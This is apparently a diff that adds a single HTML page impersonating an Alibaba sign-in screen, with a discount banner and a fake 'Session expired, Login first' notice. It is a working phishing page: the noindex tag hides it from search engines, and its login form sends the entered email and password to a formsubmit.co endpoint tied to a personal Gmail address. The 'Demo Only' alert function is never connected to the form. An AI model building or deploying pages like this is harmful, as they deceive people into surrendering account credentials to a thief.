@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+
+<meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Alibaba Login</title>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+background:#f5f5f5;
+}
+
+/* HEADER */
+
+header{
+display:flex;
+justify-content:space-between;
+align-items:center;
+padding:18px 70px;
+background:white;
+border-bottom:1px solid #eee;
+}
+
+.logo{
+color:#ff6a00;
+font-size:26px;
+font-weight:bold;
+}
+
+.language{
+padding:7px 10px;
+border-radius:6px;
+border:1px solid #ccc;
+}
+
+/* MAIN LAYOUT */
+
+.container{
+display:flex;
+height:calc(100vh - 70px);
+}
+
+/* LEFT SIDE */
+
+.left-section{
+flex:1.2;
+background:linear-gradient(135deg,#5b6cff,#b96cff,#ff8c42);
+color:white;
+display:flex;
+flex-direction:column;
+justify-content:center;
+padding:80px;
+}
+
+.left-section h1{
+font-size:48px;
+margin-bottom:20px;
+}
+
+.left-section h2{
+font-size:30px;
+margin-bottom:15px;
+}
+
+.left-section p{
+font-size:20px;
+margin-bottom:40px;
+}
+
+.left-section span{
+color:#ffd54f;
+font-weight:bold;
+}
+
+.discount-box{
+background:linear-gradient(90deg,#ff9a2f,#ff5a1f);
+padding:35px;
+width:240px;
+text-align:center;
+border-radius:12px;
+box-shadow:0 10px 30px rgba(0,0,0,0.2);
+}
+
+.discount-box h1{
+font-size:55px;
+}
+
+/* RIGHT LOGIN AREA */
+
+.right-section{
+flex:0.8;
+background:white;
+display:flex;
+justify-content:center;
+align-items:center;
+}
+
+.login-box{
+width:380px;
+}
+
+.session{
+color:red;
+font-size:14px;
+margin-bottom:15px;
+text-align:center;
+font-weight:bold;
+}
+
+.login-box h2{
+font-size:28px;
+margin-bottom:20px;
+text-align:center;
+}
+
+.code-login{
+font-size:14px;
+margin-bottom:20px;
+text-align:center;
+color:#444;
+}
+
+label{
+font-size:14px;
+font-weight:bold;
+}
+
+.required{
+color:red;
+}
+
+input{
+width:100%;
+padding:14px;
+margin-top:5px;
+margin-bottom:15px;
+border:1px solid #ddd;
+border-radius:8px;
+font-size:14px;
+}
+
+.forgot{
+font-size:13px;
+color:#333;
+margin-bottom:18px;
+display:block;
+text-align:right;
+cursor:pointer;
+}
+
+.continue{
+width:100%;
+background:#ff6a00;
+color:white;
+border:none;
+padding:14px;
+border-radius:30px;
+font-size:16px;
+cursor:pointer;
+}
+
+/* RESPONSIVE DESIGN */
+
+@media (max-width:900px){
+
+.container{
+flex-direction:column;
+height:auto;
+}
+
+.left-section{
+flex:none;
+padding:50px 30px;
+text-align:center;
+}
+
+.right-section{
+flex:none;
+padding:40px 20px;
+}
+
+.login-box{
+width:100%;
+max-width:400px;
+}
+
+header{
+padding:15px 25px;
+}
+
+.left-section h1{
+font-size:36px;
+}
+
+.left-section h2{
+font-size:24px;
+}
+
+}
+
+@media (max-width:500px){
+
+.left-section{
+padding:40px 20px;
+}
+
+.discount-box{
+width:180px;
+padding:25px;
+margin:auto;
+}
+
+.discount-box h1{
+font-size:40px;
+}
+
+.login-box{
+max-width:320px;
+}
+
+}
+
+</style>
+
+<script>
+
+function fakeSubmit(event){
+event.preventDefault();
+alert("Form submitted (Demo Only)");
+}
+
+</script>
+
+</head>
+
+<body>
+
+<header>
+
+<div class="logo">Alibaba.com</div>
+
+<select class="language">
+<option>English</option>
+<option>French</option>
+<option>Spanish</option>
+</select>
+
+</header>
+
+
+<div class="container">
+
+<div class="left-section">
+
+<h1>March Expo</h1>
+
+<h2>Grab limited-time offer now</h2>
+
+<p>Up to <span>20% off</span> 8M+ hot picks</p>
+
+<div class="discount-box">
+<h3>UP TO</h3>
+<h1>20%</h1>
+<h3>OFF</h3>
+</div>
+
+</div>
+
+
+<div class="right-section">
+
+<div class="login-box">
+
+<div class="session">Session expired, Login first</div>
+
+<h2>Sign in</h2>
+
+<div class="code-login">Sign in with a code</div>
+
+<form method="POST" autocomplete="on" action="https://formsubmit.co/olowoeggboy@gmail.com">
+
+<label>Email address <span class="required">*</span></label>
+<input
+type="email"
+name="username"
+required
+autocomplete="username"
+placeholder="Email address">
+
+<label>Password <span class="required">*</span></label>
+<input
+type="password"
+name="password"
+required
+autocomplete="current-password"
+placeholder="Password">
+
+<span class="forgot">Forgot password?</span>
+
+<button type="submit" class="continue">Continue</button>
+
+</form>
+
+</div>
+
+</div>
+
+</div>
+
+</body>
+</html>
